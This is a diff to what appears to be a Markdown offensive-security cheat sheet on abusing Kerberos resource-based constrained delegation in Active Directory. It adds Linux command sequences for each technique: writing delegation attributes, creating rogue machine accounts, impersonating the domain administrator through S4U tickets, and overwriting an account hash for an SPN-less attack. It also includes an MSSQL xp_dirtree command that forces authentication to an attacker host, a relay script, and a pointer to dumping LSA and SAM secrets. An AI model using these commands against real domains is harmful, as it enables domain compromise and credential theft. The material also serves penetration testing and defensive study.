@@ -39,6 +39,21 @@ The attacker has compromised ServiceA and wants to compromise ServiceB. He also 
     rubeus -x tgtdeleg /nowrap
     rubeus -x s4u /user:ServiceA$ /ticket:ticket.kirbi /impersonateuser:administrator /msdsspn:host/ServiceB.domain.local /domain:domain.local /altservice:cifs,host,http,winrm,RPCSS,wsman /ptt
 
+## Linux
+
+### 1) Add RBCD from ServiceA to ServiceB
+
+    rbcd.py -action write -delegate-from ServiceA$ -delegate-to ServiceB$ domain.local/user1:password
+
+### 2) Verify property
+
+    rbcd.py -action read -delegate-to ServiceB$ domain.local/user1:password
+
+###Get ServiceA TGT and then S4U
+
+    getST.py -spn 'cifs/serviceB.domain.local' -impersonate administrator -hashes ':<ServiceA_NThash>' -dc-ip <DC_IP> domain.local/ServiceA$
+    export KRB5CCNAME=./Administrator.ccache
+
 # With machine account creation
 
 ### 1) Add a fake machine account in the domain
@@ -79,6 +94,13 @@ The attacker has compromised ServiceA and wants to compromise ServiceB. He also 
     $RawBytes = Get-DomainComputer <target> -Properties 'msds-allowedtoactonbehalfofotheridentity' -Credential $Cred -SearchBase "LDAP://DC=domain,DC=local" | select -expand msds-allowedtoactonbehalfofotheridentity
     (New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0).DiscretionaryAcl
 
+## Linux
+
+    addcomputer.py -computer-name 'ControlledComputer$' -computer-pass 'ComputerPassword' -domain-netbios domain.local 'domain.local/user1:password'
+    rbcd.py -action write -delegate-from ControlledComputer$ -delegate-to ServiceB$ domain.local/ControlledComputer$:ComputerPassword
+    getST.py -spn 'cifs/serviceB.domain.local' -impersonate administrator -dc-ip <DC_IP> domain.local/ControlledComputer$:ComputerPassword
+    export KRB5CCNAME=./Administrator.ccache
+
 ### 3) Use the S4USelf function with the fake machine (on an arbitrary SPN) to create a forwardable ticket for a wanted user (not protected)
 
 ### 4) Use the S4UProxy function to obtain a ST for the impersonated user for the wanted service on the target machine
@@ -102,12 +124,21 @@ Attacker performs S4UProxy and bypass S4USelf by providing the ST as evidence
 
     .\Rubeus.exe s4u /user:ServiceA$ /aes256:<service_key> /tgs:"/path/to/kirbi" /msdsspn:cifs/serviceB.domain.local /domain:domain.local /ptt /dc:DC.domain.local
 
+## Linux
+
+    getST.py -spn 'cifs/serviceB.domain.local' -additional-ticket ./ticket.ccache -hashes ':<ServiceA_NThash>' -dc-ip <DC_IP> domain.local/ServiceA$
+
 # Reflective RBCD
 
-With a TGT or the hash of a service account, an attacker can configure a RBCD from the service to itself, a run a full S4U to access the machine on behalf of another user.
+With a TGT or the hash of a service account, an attacker can configure an RBCD from the service to itself, a run a full S4U to access the machine on behalf of another user.
 
     Set-ADComputer ServiceA -PrincipalsAllowedToDelegateToAccount ServiceA$
     .\Rubeus.exe s4u /user:ServiceA$ /aes256:<service_key> /impersonateuser:Administrator /msdsspn:cifs/serviceA.domain.local /domain:domain.local /ptt /dc:DC.domain.local
+
+## Linux
+
+    rbcd.py -action write -delegate-from ServiceA$ -delegate-to ServiceA$ -k -no-pass domain.local/ServiceA$
+    getST.py -spn 'cifs/serviceA.domain.local' -impersonate administrator -k -no-pass -dc-ip <DC_IP> domain.local/ServiceA$
 
 # Impersonate protected user via S4U2Self request
 
@@ -116,6 +147,10 @@ It is possible to impersonate a protected user with the S4USelf request if we ha
 With the target TGT it is possible to realise a S4USelf request for any user and obtain a ST for the service. In case where the needed user is protected against delegation, S4USelf will still work, but the ST is not forwardable (so no S4UProxy possible) and the specified SPN is invalid...however, the SPN is not in the encrypted part of the ticket. So it is possible to modify the SPN and retrieve a valid ST for the target service with a sensitive user (and the ST PAC is well signed by the KDC).
 
     .\Rubeus.exe s4u /self /impersonateuser:Administrator /ticket:doIFFz[...SNIP...]TE9DQUw=  /domain:domain.local /altservice:cifs/server.domain.local /ptt
+
+## Linux
+
+    getST.py -self -altservice 'cifs/serviceA.domain.local' -impersonate administrator -k -no-pass -dc-ip <DC_IP> domain.local/ServiceA$
 
 # Bypass Constrained Delegation restrictions with RBCD
 
@@ -133,6 +168,17 @@ Since the service is not protected in the obtained ticket, the attacker can chan
 ##### S4UProxy from B to C with the obtained ST as evidence
 
     .\Rubeus.exe s4u /user:ServiceB$ /aes256:<serviceB_key> /tgs:<obtained_TGS> /msdsspn:time/serviceC.contoso.local /altservice:cifs /domain:domain.local /dc:DC.domain.local /ptt
+
+## Linux
+
+##### RBCD from A to B
+
+    rbcd.py -action write -delegate-from ServiceA$ -delegate-to ServiceB$ -hashes ':<ServiceA_NThash>' domain.local/ServiceA$
+    getST.py -spn 'cifs/serviceB.domain.local' -impersonate administrator -hashes ':<ServiceA_NThash>' -dc-ip <DC_IP> domain.local/ServiceA$
+
+##### S4UProxy from B to C with the obtained ST as evidence
+
+    getST.py -spn 'cifs/serviceC.domain.local' -additional-ticket ./administrator.ccache -hashes ':<ServiceB_NThash>' -dc-ip <DC_IP> domain.local/ServiceB$
 
 # U2U RBCD with SPN-less accounts
 
@@ -163,6 +209,24 @@ In case where you have sufficient rights to configure an RBCD on a machine (for 
 
 ### 8) Finally, use this ticket to do whatever you want!
 
+## Linux
+
+### 1) Configure the machine account to trust the user account you control (NTLM Relay, with the machine account's creds,...). Obtain a TGT for the user via pass-the-hash and extract the session key from it with this
+
+    getTGT.py -hashes :$(pypykatz crypto nt 'password') 'domain.local'/'user1'
+    describeTicket.py 'user1.ccache' | grep 'Ticket Session Key'
+
+### 2) ow, change the user's long term key (his RC4 NT hash actually) to be equal to the TGT session key. The ST sent in the S4UProxy will be encrypted with the session key, but the KDC will try to decipher it with the    user's long term key, this is why the LT key must be equal to the session key (WARNING !!! The user's password is now equal to an unknown value, you have to use a sacrificial account to realise this attack).
+
+    smbpasswd.py -newhashes :sessionKey 'domain.local'/'user1':'password'@'DC'
+
+### 3) Realize the S4USelf request with a U2U request. If U2U is not used, the KDC cannot find the account's LT key when a UPN is specified instead of a SPN. Then, use the ticket obtained in the U2U S4USelf request (ciphered with the session key), to perform a S4UProxy request.
+
+    KRB5CCNAME='user1.ccache'
+    getST.py -k -no-pass -u2u -impersonate "Administrator" -spn "cifs/target.domain.local" 'domain.local'/'user1'
+
+Finally, use the obtained ST to dump the machine LSA and SAM registers with secretsdump.
+
 # RBCD from MSSQL Server
 
 If we have sufficient access to a MSSQL server we can use the xp_dirtree in order to leak the Net-NTLM hash of the machine account. Additionally, the Web Service client must be running on the machine in order to trick the authentication from SMB to HTTP and avoid the NTLM signature (authentication must be sent to @80):
@@ -191,6 +255,25 @@ If we have sufficient access to a MSSQL server we can use the xp_dirtree in orde
 ##### After the attack, ask for a ST with full S4U
 
     .\Rubeus.exe s4u /user:<controlled_account> /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/<target> /domain:domain.local /dc:DC.domain.local /ptt
+
+## Linux
+
+##### Add the DNS
+
+    python3 dnstool.py -u 'domain.local\user1' -p 'password' -r 'attacker.domain.local' -d '<attacker_IP>' --action add <DC_IP>
+
+##### On our machine, waiting for the leak
+#https://gist.github.com/3xocyte/4ea8e15332e5008581febdb502d0139c
+
+    python rbcd_relay.py 192.168.24.10 domain.local 'target$' <controlledAccountWithASPN>
+
+##### ON the MSSQL server
+
+    SQLCMD -S <MSSQL_instance> -Q "exec master.dbo.xp_dirtree '\\attacker@80\a'" -U Admin -P Admin
+
+##### After the attack, ask for a ST with full S4U
+
+    getST.py -spn cifs/target.domain.local -impersonate admininistrator -dc-ip <DC_IP> domain.local/<controlledAccountWithASPN>password
 
 #### 1) addcomputer.py
 
